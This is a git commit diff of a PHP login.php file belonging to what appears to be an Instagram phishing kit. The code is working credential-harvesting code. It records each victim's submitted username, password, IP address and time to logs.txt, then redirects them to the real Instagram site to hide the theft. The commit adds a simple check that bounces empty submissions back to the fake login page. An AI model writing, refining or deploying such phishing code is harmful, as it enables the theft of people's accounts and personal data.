3149f8401b96db8e13eacb4886719795f36d32d4
ExilasP <57598719+ExilasP@users.noreply.github.com>
2020-05-25 17:41:28 +0200

    Update login.php

--- login.php
+++ login.php
@@ -1,22 +1,29 @@
 <?php
-	
-	date_default_timezone_set('Europe/Paris');
-	$date = date("d-n-Y");
-	$time = date("H:i:s");
 
-	$ip = $_SERVER['REMOTE_ADDR'];
-	$hostname = gethostbyaddr($ip);
+	if ($_POST['username'] <= 0 and $_POST['password'] < 6){
+		header("Location: index.php");
+	}
 
-	$message .= "========== Instagram Login ==========\n";
-	$message .= "User: ".$_POST['username']."\n";
-	$message .= "Pass: ".$_POST['password']."\n";
-	$message .= "--------------------\n";
-	$message .= "IP  : ".$ip."\n";
-	$message .= "Log : ".$time." / ".$date."\n \n";
+	else{
 
-	$file = fopen("logs.txt", "ab");
-	fwrite($file, $message);
-	fclose($file);
+		date_default_timezone_set('Europe/Paris');
+		$date = date("d-n-Y");
+		$time = date("H:i:s");
 
-	header("Location: https://www.instagram.com");
+		$ip = $_SERVER['REMOTE_ADDR'];
+		$hostname = gethostbyaddr($ip);
+
+		$message .= "========== Instagram Login ==========\n";
+		$message .= "User: ".$_POST['username']."\n";
+		$message .= "Pass: ".$_POST['password']."\n";
+		$message .= "--------------------\n";
+		$message .= "IP  : ".$ip."\n";
+		$message .= "Log : ".$time." / ".$date."\n \n";
+
+		$file = fopen("logs.txt", "ab");
+		fwrite($file, $message);
+		fclose($file);
+
+		header("Location: https://www.instagram.com");
+	}
 ?>
